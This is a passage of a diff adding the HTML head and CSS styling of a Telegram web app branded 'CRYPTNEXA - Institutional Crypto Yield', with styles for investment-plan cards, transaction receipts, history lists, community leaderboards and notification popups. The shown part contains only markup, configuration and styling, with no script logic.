@@ -1,0 +1,3329 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>CRYPTNEXA - Institutional Crypto Yield</title>
+
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: { 
+            sans: ['Plus Jakarta Sans', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          },
+          colors: {
+            brand: {
+              bg: '#080b11',
+              card: '#111622',
+              border: 'rgba(255, 255, 255, 0.08)',
+              emerald: '#10b981',
+              cyan: '#06b6d4',
+              accent: '#3b82f6'
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    * { -webkit-tap-highlight-color: transparent; }
+    html { scroll-behavior: smooth; }
+    
+    body { 
+      background-color: #080b11; 
+      color: #f3f4f6; 
+      user-select: none;
+      overscroll-behavior-y: none;
+    }
+    
+    .glass-card { 
+      background: rgba(17, 22, 34, 0.85); 
+      backdrop-filter: blur(16px); 
+      border: 1px solid rgba(255, 255, 255, 0.08); 
+    }
+    
+    .gradient-text { 
+      background: linear-gradient(135deg, #10b981 0%, #06b6d4 100%); 
+      -webkit-background-clip: text; 
+      -webkit-text-fill-color: transparent; 
+    }
+    
+    .gradient-bg { background: linear-gradient(135deg, #10b981 0%, #06b6d4 100%); }
+    
+    .tab-content { display: none; }
+    .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes modalFadeIn {
+      0% { opacity: 0; transform: scale(0.9) translateY(16px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    @keyframes shimmer {
+      0% { background-position: -1000px 0; }
+      100% { background-position: 1000px 0; }
+    }
+
+    @keyframes progressBar {
+      from { width: 100%; }
+      to { width: 0%; }
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    @keyframes spinSlow {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes checkmark {
+      0% { stroke-dashoffset: 100; }
+      100% { stroke-dashoffset: 0; }
+    }
+
+    @keyframes scaleIn {
+      0% { transform: scale(0); opacity: 0; }
+      60% { transform: scale(1.1); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-animate-in { animation: modalFadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+
+    /* ===== SIMPLE BYBIT-STYLE PROCESSING ===== */
+    .simple-processing-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10001;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s ease;
+    }
+
+    .simple-processing-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .simple-processing-card {
+      width: 100%;
+      max-width: 280px;
+      background: linear-gradient(165deg, #131a28 0%, #0c1220 100%);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 24px;
+      padding: 32px 24px 24px;
+      text-align: center;
+      transform: scale(0.9) translateY(10px);
+      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+      box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.9);
+    }
+
+    .simple-processing-overlay.show .simple-processing-card {
+      transform: scale(1) translateY(0);
+    }
+
+    .simple-spinner {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      border: 3px solid rgba(16, 185, 129, 0.15);
+      border-top-color: #10b981;
+      animation: spinSlow 0.8s linear infinite;
+      position: relative;
+    }
+
+    .simple-spinner::after {
+      content: '';
+      position: absolute;
+      inset: 6px;
+      border-radius: 50%;
+      border: 2px solid rgba(6, 182, 212, 0.1);
+      border-top-color: #06b6d4;
+      animation: spinSlow 1.2s linear infinite reverse;
+    }
+
+    .simple-checkmark {
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #10b981, #06b6d4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: scaleIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      box-shadow: 0 10px 30px -8px rgba(16, 185, 129, 0.6);
+    }
+
+    .simple-checkmark svg {
+      width: 28px;
+      height: 28px;
+      stroke: #000;
+      stroke-width: 3;
+      fill: none;
+    }
+
+    .simple-checkmark svg path {
+      stroke-dasharray: 100;
+      stroke-dashoffset: 100;
+      animation: checkmark 0.4s ease forwards;
+      animation-delay: 0.1s;
+    }
+
+    .simple-processing-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 6px;
+      letter-spacing: -0.01em;
+    }
+
+    .simple-processing-subtitle {
+      font-size: 11px;
+      color: #9ca3af;
+      line-height: 1.5;
+    }
+
+    .simple-processing-amount {
+      margin-top: 18px;
+      padding: 12px 16px;
+      background: rgba(16, 185, 129, 0.08);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .simple-processing-amount-label {
+      font-size: 9px;
+      color: #6b7280;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      font-weight: 700;
+    }
+
+    .simple-processing-amount-value {
+      font-size: 15px;
+      font-weight: 800;
+      font-family: 'JetBrains Mono', monospace;
+      background: linear-gradient(135deg, #10b981, #06b6d4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    /* ===== PROFESSIONAL RECEIPT ===== */
+    .pro-receipt {
+      width: 100%;
+      max-width: 340px;
+      max-height: 95vh;
+      display: flex;
+      flex-direction: column;
+      background: #0c1220;
+      border-radius: 20px;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.95);
+      position: relative;
+    }
+
+    .pro-receipt-header {
+      padding: 20px 20px 16px;
+      text-align: center;
+      background: linear-gradient(180deg, rgba(16, 185, 129, 0.08) 0%, transparent 100%);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      position: relative;
+    }
+
+    .pro-receipt-status-icon {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 12px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pro-receipt-status-icon.success {
+      background: linear-gradient(135deg, #10b981, #06b6d4);
+      box-shadow: 0 8px 24px -6px rgba(16, 185, 129, 0.5);
+    }
+
+    .pro-receipt-status-icon.pending {
+      background: linear-gradient(135deg, #f59e0b, #f97316);
+      box-shadow: 0 8px 24px -6px rgba(245, 158, 11, 0.5);
+    }
+
+    .pro-receipt-status-icon.failed {
+      background: linear-gradient(135deg, #ef4444, #f97316);
+      box-shadow: 0 8px 24px -6px rgba(239, 68, 68, 0.5);
+    }
+
+    .pro-receipt-status-icon svg {
+      width: 24px;
+      height: 24px;
+      color: #000;
+      stroke-width: 3;
+    }
+
+    .pro-receipt-amount {
+      font-size: 32px;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      line-height: 1.1;
+      margin-bottom: 4px;
+    }
+
+    .pro-receipt-amount.positive { color: #10b981; }
+    .pro-receipt-amount.negative { color: #06b6d4; }
+    .pro-receipt-amount.neutral { color: #a855f7; }
+
+    .pro-receipt-type-label {
+      font-size: 10px;
+      color: #6b7280;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      font-weight: 700;
+    }
+
+    .pro-receipt-status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 10px;
+      padding: 4px 12px;
+      border-radius: 999px;
+      font-size: 9px;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .pro-receipt-status-badge.completed {
+      background: rgba(16, 185, 129, 0.15);
+      color: #10b981;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .pro-receipt-status-badge.pending {
+      background: rgba(245, 158, 11, 0.15);
+      color: #f59e0b;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+    }
+
+    .pro-receipt-status-badge.failed {
+      background: rgba(239, 68, 68, 0.15);
+      color: #ef4444;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    .pro-receipt-status-badge.active {
+      background: rgba(6, 182, 212, 0.15);
+      color: #06b6d4;
+      border: 1px solid rgba(6, 182, 212, 0.3);
+    }
+
+    .pro-receipt-body {
+      padding: 16px 20px;
+      overflow-y: auto;
+      flex: 1;
+    }
+
+    .pro-receipt-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 10px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      gap: 12px;
+    }
+
+    .pro-receipt-row:last-child { border-bottom: none; }
+
+    .pro-receipt-row-label {
+      font-size: 10px;
+      color: #6b7280;
+      font-weight: 600;
+      flex-shrink: 0;
+    }
+
+    .pro-receipt-row-value {
+      font-size: 11px;
+      font-weight: 700;
+      color: #ffffff;
+      font-family: 'JetBrains Mono', monospace;
+      text-align: right;
+      word-break: break-all;
+      line-height: 1.4;
+    }
+
+    .pro-receipt-address-box {
+      background: rgba(6, 182, 212, 0.06);
+      border: 1px solid rgba(6, 182, 212, 0.2);
+      border-radius: 10px;
+      padding: 10px 12px;
+      margin: 8px 0;
+    }
+
+    .pro-receipt-address-label {
+      font-size: 8px;
+      color: #06b6d4;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      font-weight: 800;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .pro-receipt-address-label svg {
+      width: 10px;
+      height: 10px;
+    }
+
+    .pro-receipt-address-value {
+      font-size: 10px;
+      color: #e5e7eb;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+      word-break: break-all;
+      line-height: 1.4;
+    }
+
+    .pro-receipt-txid-box {
+      background: rgba(16, 185, 129, 0.06);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      border-radius: 10px;
+      padding: 10px 12px;
+      margin: 8px 0;
+    }
+
+    .pro-receipt-txid-label {
+      font-size: 8px;
+      color: #10b981;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      font-weight: 800;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .pro-receipt-txid-label svg {
+      width: 10px;
+      height: 10px;
+    }
+
+    .pro-receipt-txid-value {
+      font-size: 9px;
+      color: #e5e7eb;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+      word-break: break-all;
+      line-height: 1.5;
+    }
+
+    .pro-receipt-footer {
+      padding: 12px 20px 16px;
+      background: rgba(8, 11, 17, 0.6);
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      text-align: center;
+    }
+
+    .pro-receipt-footer-text {
+      font-size: 8px;
+      color: #4b5563;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 0.05em;
+    }
+
+    .pro-receipt-footer-brand {
+      font-size: 7px;
+      color: #374151;
+      text-transform: uppercase;
+      letter-spacing: 0.2em;
+      font-weight: 700;
+      margin-top: 2px;
+    }
+
+    .pro-receipt-close {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #9ca3af;
+      cursor: pointer;
+      transition: all 0.2s;
+      z-index: 10;
+    }
+
+    .pro-receipt-close:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+    }
+
+    .pro-receipt-close svg {
+      width: 14px;
+      height: 14px;
+    }
+
+    /* ===== HISTORY CARDS ===== */
+    .pro-history-card {
+      position: relative;
+      border-radius: 14px;
+      padding: 14px;
+      background: #111622;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      transition: all 0.2s;
+      cursor: pointer;
+    }
+
+    .pro-history-card:hover {
+      border-color: rgba(16, 185, 129, 0.3);
+      background: #141b2a;
+    }
+
+    .pro-history-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 18px;
+      font-weight: 800;
+    }
+
+    .pro-history-icon.deposit { background: rgba(16, 185, 129, 0.12); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.2); }
+    .pro-history-icon.withdraw { background: rgba(6, 182, 212, 0.12); color: #06b6d4; border: 1px solid rgba(6, 182, 212, 0.2); }
+    .pro-history-icon.investment { background: rgba(168, 85, 247, 0.12); color: #a855f7; border: 1px solid rgba(168, 85, 247, 0.2); }
+
+    .pro-history-title { font-size: 12px; font-weight: 700; color: #ffffff; line-height: 1.3; }
+    .pro-history-subtitle { font-size: 10px; color: #6b7280; font-family: 'JetBrains Mono', monospace; margin-top: 2px; }
+    .pro-history-amount { font-size: 14px; font-weight: 800; font-family: 'JetBrains Mono', monospace; line-height: 1.2; }
+    .pro-history-amount.positive { color: #10b981; }
+    .pro-history-amount.negative { color: #06b6d4; }
+    .pro-history-amount.neutral { color: #a855f7; }
+
+    .pro-history-status { font-size: 9px; font-weight: 700; padding: 2px 8px; border-radius: 999px; text-transform: uppercase; letter-spacing: 0.03em; }
+    .pro-history-status.completed { background: rgba(16, 185, 129, 0.15); color: #10b981; }
+    .pro-history-status.pending { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
+    .pro-history-status.failed { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
+    .pro-history-status.active { background: rgba(6, 182, 212, 0.15); color: #06b6d4; }
+
+    .pro-history-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(255, 255, 255, 0.04);
+    }
+
+    .pro-history-meta-item {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 9px;
+      color: #6b7280;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .pro-history-meta-item svg { width: 11px; height: 11px; }
+    .pro-history-view-btn { display: flex; align-items: center; gap: 3px; font-size: 9px; color: #10b981; font-weight: 700; }
+
+    /* ===== INVEST PLANS ===== */
+    .invest-plan-pro {
+      position: relative;
+      border-radius: 18px;
+      padding: 20px 18px 18px;
+      overflow: hidden;
+      background: linear-gradient(160deg, #0f1826 0%, #0a121c 60%, #080d16 100%);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .invest-plan-pro::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: var(--plan-gradient);
+      opacity: 1;
+    }
+
+    .invest-plan-pro::after {
+      content: '';
+      position: absolute;
+      top: -50%; right: -30%;
+      width: 200px; height: 200px;
+      border-radius: 50%;
+      background: radial-gradient(circle, var(--plan-glow) 0%, transparent 70%);
+      filter: blur(40px);
+      pointer-events: none;
+      opacity: 0.6;
+    }
+
+    .invest-plan-pro:hover {
+      transform: translateY(-3px);
+      border-color: var(--plan-color);
+      box-shadow: 0 15px 50px -15px var(--plan-color);
+    }
+
+    .invest-plan-starter { --plan-color: #10b981; --plan-gradient: linear-gradient(90deg, #10b981, #06b6d4); --plan-glow: rgba(16, 185, 129, 0.3); }
+    .invest-plan-silver { --plan-color: #06b6d4; --plan-gradient: linear-gradient(90deg, #06b6d4, #3b82f6); --plan-glow: rgba(6, 182, 212, 0.3); }
+    .invest-plan-gold { --plan-color: #f59e0b; --plan-gradient: linear-gradient(90deg, #f59e0b, #f97316); --plan-glow: rgba(245, 158, 11, 0.3); }
+    .invest-plan-vip { --plan-color: #a855f7; --plan-gradient: linear-gradient(90deg, #a855f7, #6366f1); --plan-glow: rgba(168, 85, 247, 0.3); }
+
+    .invest-plan-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 9px;
+      font-weight: 900;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--plan-color);
+      color: var(--plan-color);
+    }
+
+    .invest-plan-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--plan-gradient);
+      color: #000;
+      box-shadow: 0 6px 24px -6px var(--plan-color);
+      flex-shrink: 0;
+    }
+
+    .invest-plan-roi {
+      font-size: 32px;
+      font-weight: 900;
+      background: var(--plan-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      line-height: 1;
+      letter-spacing: -0.03em;
+    }
+
+    .invest-plan-roi-label { font-size: 8px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.1em; font-weight: 800; margin-top: 4px; }
+    .invest-plan-title { font-size: 15px; font-weight: 800; color: #ffffff; letter-spacing: -0.01em; line-height: 1.2; }
+
+    .invest-plan-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 16px 0 14px; }
+    .invest-plan-meta-cell { background: rgba(8, 11, 17, 0.8); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 9px 11px; }
+    .invest-plan-meta-label { font-size: 8px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.08em; font-weight: 800; display: block; margin-bottom: 3px; }
+    .invest-plan-meta-value { font-size: 12px; font-weight: 800; color: #ffffff; font-family: 'JetBrains Mono', monospace; letter-spacing: -0.01em; }
+
+    .invest-plan-features { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 14px; }
+    .invest-plan-feature-tag { font-size: 8px; font-weight: 700; padding: 3px 8px; border-radius: 6px; background: rgba(255, 255, 255, 0.04); color: #9ca3af; border: 1px solid rgba(255, 255, 255, 0.06); letter-spacing: 0.03em; text-transform: uppercase; }
+
+    .invest-plan-cta {
+      width: 100%;
+      padding: 13px;
+      border-radius: 12px;
+      background: var(--plan-gradient);
+      color: #000;
+      font-size: 12px;
+      font-weight: 900;
+      letter-spacing: 0.03em;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      box-shadow: 0 8px 24px -8px var(--plan-color);
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+    }
+
+    .invest-plan-cta:hover { filter: brightness(1.1); transform: translateY(-1px); }
+    .invest-plan-cta:active { transform: scale(0.98); }
+
+    .invest-plan-popular {
+      position: absolute;
+      top: 14px;
+      right: -32px;
+      transform: rotate(45deg);
+      background: linear-gradient(90deg, #f59e0b, #f97316);
+      color: #000;
+      font-size: 8px;
+      font-weight: 900;
+      letter-spacing: 0.12em;
+      padding: 4px 36px;
+      text-transform: uppercase;
+      box-shadow: 0 3px 12px rgba(245, 158, 11, 0.5);
+      z-index: 2;
+    }
+
+    /* ===== COMMUNITY ===== */
+    .community-hero {
+      background: linear-gradient(165deg, #0f1826 0%, #0a121c 50%, #080d16 100%);
+      border: 1px solid rgba(16, 185, 129, 0.25);
+      border-radius: 22px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 20px 60px -15px rgba(0, 0, 0, 0.8), 0 0 60px -20px rgba(16, 185, 129, 0.2);
+    }
+
+    .community-hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #10b981, #06b6d4, transparent);
+      background-size: 200% 100%;
+      animation: shimmer 3s infinite;
+    }
+
+    .community-stat-card { background: rgba(8, 11, 17, 0.7); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 14px; padding: 14px 12px; text-align: center; transition: all 0.2s; }
+    .community-stat-card:hover { border-color: rgba(16, 185, 129, 0.3); transform: translateY(-2px); }
+    .community-stat-icon { width: 36px; height: 36px; border-radius: 11px; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; }
+    .community-stat-value { font-size: 18px; font-weight: 900; font-family: 'JetBrains Mono', monospace; color: #ffffff; line-height: 1.2; }
+    .community-stat-label { font-size: 9px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.06em; font-weight: 800; margin-top: 3px; }
+
+    .user-card { background: linear-gradient(160deg, #0f1826 0%, #0a121c 100%); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 14px; padding: 12px; transition: all 0.2s; position: relative; overflow: hidden; }
+    .user-card:hover { border-color: rgba(16, 185, 129, 0.25); transform: translateY(-1px); }
+    .user-avatar-rank { width: 42px; height: 42px; border-radius: 13px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 15px; flex-shrink: 0; position: relative; }
+    .user-rank-badge { position: absolute; bottom: -4px; right: -4px; font-size: 12px; line-height: 1; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6)); }
+    .user-name-display { font-size: 12px; font-weight: 800; color: #ffffff; line-height: 1.2; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .user-id-display { font-size: 9px; color: #06b6d4; font-family: 'JetBrains Mono', monospace; font-weight: 700; margin-top: 1px; }
+    .user-balance-display { font-size: 13px; font-weight: 900; font-family: 'JetBrains Mono', monospace; color: #10b981; text-align: right; line-height: 1.2; }
+    .user-balance-label { font-size: 8px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.08em; font-weight: 800; text-align: right; }
+    .user-tier-chip { display: inline-flex; align-items: center; gap: 3px; font-size: 8px; font-weight: 800; padding: 2px 7px; border-radius: 999px; letter-spacing: 0.05em; text-transform: uppercase; }
+    .user-tier-starter { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); }
+    .user-tier-silver { background: rgba(6, 182, 212, 0.15); color: #06b6d4; border: 1px solid rgba(6, 182, 212, 0.3); }
+    .user-tier-gold { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+    .user-tier-vip { background: rgba(168, 85, 247, 0.15); color: #a855f7; border: 1px solid rgba(168, 85, 247, 0.3); }
+
+    .community-search-box {
+      background: rgba(8, 11, 17, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transition: all 0.2s;
+    }
+
+    .community-search-box:focus-within {
+      border-color: rgba(16, 185, 129, 0.5);
+      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
+    }
+
+    .community-search-input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #ffffff;
+      font-size: 12px;
+      width: 100%;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    .community-search-input::placeholder { color: #4b5563; }
+
+    /* ===== PRIVACY ===== */
+    .privacy-card {
+      background: linear-gradient(160deg, #0f1826 0%, #0a121c 100%);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+      padding: 18px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .privacy-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, #10b981, #06b6d4);
+      opacity: 0.8;
+    }
+
+    .privacy-heading { font-size: 13px; font-weight: 800; color: #ffffff; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
+    .privacy-heading-icon { width: 28px; height: 28px; border-radius: 8px; background: rgba(16, 185, 129, 0.12); color: #10b981; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .privacy-text { font-size: 11px; color: #9ca3af; line-height: 1.7; }
+    .privacy-text strong { color: #e5e7eb; font-weight: 700; }
+    .privacy-bullet { display: flex; align-items: flex-start; gap: 8px; padding: 6px 0; font-size: 11px; color: #9ca3af; line-height: 1.6; }
+    .privacy-bullet-dot { width: 6px; height: 6px; border-radius: 50%; background: #10b981; flex-shrink: 0; margin-top: 6px; box-shadow: 0 0 6px rgba(16, 185, 129, 0.6); }
+
+    /* ===== REST ===== */
+    #admin-notify-popup {
+      position: fixed; top: 16px; left: 50%;
+      transform: translateX(-50%) translateY(-150px) scale(0.9);
+      opacity: 0;
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      z-index: 9999; width: 92%; max-width: 380px;
+      pointer-events: none; border-radius: 18px; overflow: hidden;
+    }
+    
+    #admin-notify-popup.show-popup {
+      transform: translateX(-50%) translateY(0) scale(1);
+      opacity: 1; pointer-events: auto;
+    }
+
+    .toast-container { background: linear-gradient(135deg, #0f1826 0%, #0a121c 100%); border: 1px solid rgba(16, 185, 129, 0.35); box-shadow: 0 20px 50px -10px rgba(0, 0, 0, 0.8), 0 0 40px -10px rgba(16, 185, 129, 0.3); border-radius: 18px; position: relative; overflow: hidden; }
+    .toast-progress { position: absolute; bottom: 0; left: 0; height: 3px; background: linear-gradient(90deg, #10b981, #06b6d4); animation: progressBar 5.5s linear forwards; }
+    .live-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); animation: pulse 2s infinite; }
+
+    .modern-alert-overlay {
+      position: fixed; inset: 0;
+      background: rgba(4, 6, 11, 0.85);
+      backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+      display: flex; align-items: center; justify-content: center;
+      padding: 20px; z-index: 10000;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modern-alert-overlay.show { opacity: 1; pointer-events: auto; }
+    .modern-alert-card {
+      width: 100%; max-width: 320px;
+      border-radius: 22px; padding: 26px 22px 20px;
+      background: linear-gradient(165deg, #0f1826 0%, #0a121c 60%, #080d16 100%);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 40px 100px -25px rgba(0, 0, 0, 0.95), 0 0 80px -20px rgba(16, 185, 129, 0.25);
+      position: relative; overflow: hidden;
+      transform: scale(0.85) translateY(20px); opacity: 0;
+      transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .modern-alert-overlay.show .modern-alert-card { transform: scale(1) translateY(0); opacity: 1; }
+    .modern-alert-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: var(--alert-accent, linear-gradient(90deg, #10b981, #06b6d4)); }
+    .modern-alert-glow { position: absolute; top: -80px; left: 50%; transform: translateX(-50%); width: 220px; height: 220px; border-radius: 50%; background: var(--alert-glow, radial-gradient(circle, rgba(16, 185, 129, 0.25) 0%, transparent 65%)); filter: blur(20px); pointer-events: none; }
+    .modern-alert-icon-wrap { width: 68px; height: 68px; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; background: var(--alert-icon-bg, linear-gradient(145deg, #10b981, #06b6d4)); box-shadow: 0 15px 35px -10px var(--alert-shadow, rgba(16, 185, 129, 0.6)), inset 0 2px 0 rgba(255,255,255,0.2); color: #000; position: relative; z-index: 1; animation: iconEnter 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
+    .modern-alert-icon-wrap svg { width: 34px; height: 34px; stroke-width: 2.5; }
+    .modern-alert-title { font-size: 17px; font-weight: 900; color: #fff; text-align: center; letter-spacing: -0.02em; margin-bottom: 6px; position: relative; z-index: 1; }
+    .modern-alert-message { font-size: 12px; color: #9ca3af; text-align: center; line-height: 1.55; margin-bottom: 20px; padding: 0 4px; position: relative; z-index: 1; }
+    .modern-alert-btn { width: 100%; padding: 12px; border-radius: 14px; background: var(--alert-accent, linear-gradient(90deg, #10b981, #06b6d4)); color: #000; font-size: 13px; font-weight: 900; letter-spacing: 0.03em; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 8px 24px -8px var(--alert-shadow, rgba(16, 185, 129, 0.6)); transition: all 0.2s; position: relative; z-index: 1; }
+    .modern-alert-btn:active { transform: scale(0.97); }
+    .modern-alert-btn svg { width: 15px; height: 15px; }
+    .modern-alert-id { font-size: 8px; color: #374151; text-align: center; font-family: 'JetBrains Mono', monospace; margin-top: 12px; letter-spacing: 0.1em; text-transform: uppercase; position: relative; z-index: 1; }
+
+    button:active { transform: scale(0.97); }
+    button { transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(16, 185, 129, 0.3); border-radius: 2px; }
+
+    input:focus, textarea:focus, select:focus { outline: none; border-color: rgba(16, 185, 129, 0.5) !important; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1); }
+    input, textarea, select { -webkit-user-select: text !important; user-select: text !important; }
+
+    .network-card { position: relative; border-radius: 16px; padding: 12px; cursor: pointer; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); background: linear-gradient(145deg, rgba(22, 28, 44, 0.9) 0%, rgba(15, 20, 32, 0.9) 100%); border: 1.5px solid rgba(255, 255, 255, 0.06); overflow: hidden; }
